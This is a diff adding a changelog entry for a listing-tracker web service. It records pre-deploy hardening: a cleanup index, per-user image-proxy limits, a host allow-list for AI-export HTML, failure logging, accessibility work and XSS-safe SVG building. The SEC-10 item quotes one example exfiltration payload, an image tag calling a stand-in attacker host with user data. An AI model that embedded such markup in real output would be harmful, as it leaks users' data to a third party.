@@ -14,7 +14,144 @@ cut across all three.
 
 ## Unreleased
 
-### Wave 25.6 — FE-M5 complete (delete 13 dead-weight !important markers) _(this commit)_
+### Wave 29 — MEDIUM/LOW sweep (BE-06, BE-08, SEC-08/10, AI-08, FE-05/06/07/08) _(this commit)_
+
+Pre-deploy hardening pass. Each item is small in isolation; the wave
+groups them because they share the property that they only matter once
+the service is publicly reachable. With CRITICAL+HIGH closed in
+Waves 26/27/28, deploying without this batch would have left a handful
+of HTTPS-only abuse vectors and a11y gaps exposed on day one.
+
+**Backend — DB & cleanup:**
+
+* **BE-06 / BE-08** — new migration ``20260511_0007_wave29_cleanup_index``
+  adds a partial index ``idx_query_listing_states_cleanup (last_seen_at)
+  WHERE active = false``. The nightly scheduler cleanup
+  (``cleanup_inactive_listing_states``) previously seq-scanned the whole
+  ``query_listing_states`` table because no surviving index keyed on
+  either ``active`` or ``last_seen_at`` — Wave 17 dropped the plain
+  boolean index by design, but neither it nor the surviving compound
+  (query, active) help when the predicate is ``active=false AND
+  last_seen_at < cutoff``. The new partial index only materialises the
+  rows the cleanup actually touches (typically <5% of the table after
+  one retention cycle), so the cleanup becomes a small range-scan.
+  Migration also runs ``ANALYZE query_listing_states`` (BE-08) so the
+  planner picks the new index on the next query instead of waiting
+  for autovacuum's stats refresh. Model-level declaration uses
+  ``postgresql_where`` / ``sqlite_where`` for autogenerate-clean diffs.
+
+**Backend — image proxy concurrency:**
+
+* **SEC-08 / INF-09** — ``/api/v1/img/{path}`` slowapi limit tightened
+  from ``300/minute`` to ``60/minute`` (still keyed per-user via
+  ``tg:{user_id}``). On top of that, a per-user asyncio semaphore
+  (``_USER_TRANSCODE_LIMIT=2``) wraps the global Pillow transcode
+  pool (``_TRANSCODE_LIMIT=4``). When a user already has 2 transcodes
+  in flight, the third returns ``429`` synchronously — ``locked()``
+  check runs in the same event-loop tick as the ``acquire()`` so the
+  fail-fast path is race-free. Holding the semaphore across upstream
+  fetch + transcode means a slow Kufar response also counts toward
+  the user's budget instead of letting an abuser cheaply queue many
+  in-flight HTTP gets. Registry is FIFO-evicted past 1024 entries the
+  same way ``ai_task_store._task_locks`` is bounded.
+
+**Backend — AI export sanitiser:**
+
+* **SEC-10** — ``_sanitize_export_html`` (used for AI-generated PDF/HTML
+  reports) now validates ``<img src>`` and ``<a href>`` against an
+  explicit Kufar host allow-list (``kufar.by``, ``www.kufar.by``,
+  ``rms.kufar.by``, ``cre.kufar.by``, ``re.kufar.by``). ``nh3``'s
+  ``attribute_filter`` callback strips any URL outside the list while
+  keeping the tag itself (so a tracking pixel renders as a broken-
+  image placeholder, an attacker anchor renders as inert text — both
+  obvious feedback during debugging). Previously the only URL filter
+  was ``url_schemes={"https"}`` which allowed any HTTPS host: an
+  attacker who could once smuggle markup through ``payload.html``
+  could exfiltrate via ``<img src="https://attacker.test/p?u=…">``
+  before this change. Each drop is logged at INFO with the first 64
+  chars of the URL for forensics.
+
+**Backend — AI dual-failure observability:**
+
+* **AI-08** — ``analyze_listing_parallel`` already log-warns each
+  failing sub-call individually, but on-call had to correlate two
+  WARN lines to spot a true bilateral outage. The merge branch now
+  emits one structured ``AI_DUAL_FAIL`` ERROR carrying both exception
+  class names + first 200 chars of message — single grep signature
+  for the failure mode. Wave 27's per-call WARNings stay so we don't
+  lose the "only call B failed" telemetry.
+
+**Frontend — accessibility:**
+
+* **FE-05** — every emoji in ``render_trackers.js`` is now wrapped in
+  ``<span aria-hidden="true">`` via a new ``emojiLabel(class, emoji,
+  text)`` helper, so screen readers announce the meaningful text
+  label ("Минск", "Падение цены", "Частное лицо") instead of the
+  Unicode name of the glyph ("BACKHAND INDEX POINTING DOWN" is not
+  a useful price-drop marker). Six glyph touch-points covered:
+  📍 region, 👤 seller, 🕐 last-check, 📱 placeholder, 🆕/🔽/🎯/📉
+  event-type badges, and the 🔍 search hint. The 📱 fallback
+  thumbnail also gets ``role="img" aria-label="Нет фото"`` so it
+  surfaces a real alt text instead of "MOBILE PHONE".
+
+* **FE-06** — analytics canvases (``priceChart``, ``historyChart``,
+  ``profitChart``) flipped from ``aria-hidden="true"`` (invisible to
+  screen readers) to ``role="img" aria-label="…"`` with a short
+  human-readable summary. The wrapping div's redundant ``aria-label``
+  was removed since labels on non-interactive divs aren't reliably
+  exposed by SRs anyway.
+
+**Frontend — defensive fixes:**
+
+* **FE-07** — ``URL.revokeObjectURL(url)`` calls in ``app_actions.js``
+  now run inside a ``setTimeout(…, 1000)`` so the browser actually
+  has time to commit the download. On slow Android WebViews and weak
+  desktops, ``a.click()`` queues the navigation but doesn't start the
+  byte transfer before the next microtask tick, so revoking
+  immediately caused empty downloads in real testing. Touches both
+  the CSV/XLSX leads export path and the JSON account-data export.
+
+* **FE-08** — replaced ``innerHTML = "<svg…>"`` with
+  ``createElementNS`` for every SVG icon in ``render_trackers.js``
+  (pause/play, edit, delete, search icons) plus the skeleton-card
+  ``<div class="skel-bar">`` ladder. The previous strings were
+  hardcoded source-code constants so they were safe at this exact
+  revision — the audit specifically flagged "potential XSS during
+  future refactor" because adding any runtime interpolation to one
+  of those strings would have silently re-introduced the
+  vulnerability. The descriptor-based builder (``buildSvgIcon(viewBox,
+  attrs, children)``) cannot execute injected script regardless of
+  input.
+
+**Already closed before this wave (verified, no action needed):**
+
+* SEC-09 (Retry-After parsing) — closed in Wave 27
+* AI-09 (Pydantic ``max_length`` on AI request schemas) — present in
+  ``api/schemas.py`` since the original schema definitions
+* AI-10 (tests for ``ai_guardrails`` / ``ai_category_data``) — closed
+  in Wave 28's ``test_ai_guardrails_unit.py``
+* TEST-05 (semaphore loop-bound) — Wave 26 made the lazy initialiser
+  loop-bound; the comment is now inline
+* TEST-06 (pytest-cov in CI) — already configured in
+  ``.github/workflows/ci.yml`` and ``pyproject.toml``
+
+**Tests:** added 8 new tests (3 image-proxy concurrency-cap, 4 export
+sanitiser allow-list, 1 AI_DUAL_FAIL structured log). 590 → 598
+passing, 1 skipped — no regressions in the rest of the suite. The
+skipped test is unchanged from baseline.
+
+**Static cache-bust:** ``scripts/bump_static_version.sh`` rolled the
+``?v=…`` tag and the frontend container was recreated. Index, action
+JS, and tracker render JS all ship under the new tag.
+
+**Audit progress:** with Wave 29 in, every CRITICAL and HIGH from
+``DEEP_DIVE_REVIEW_COMPREHENSIVE.md`` is closed and the only items
+remaining are MEDIUM/LOW infrastructure work that needs the
+production deploy first (CDN, materialised views, Prometheus
+metrics, distributed singleflight, nonce-based CSP). Service is
+ready to leave the cloudflared quick-tunnel sandbox.
+
+### Wave 25.6 — FE-M5 complete (delete 13 dead-weight !important markers)
 
 Second pass on FE-M5 — the cluster Wave 25.4 deferred for visual
 review. Static cascade audit + a sweep of every `.style.*` write in
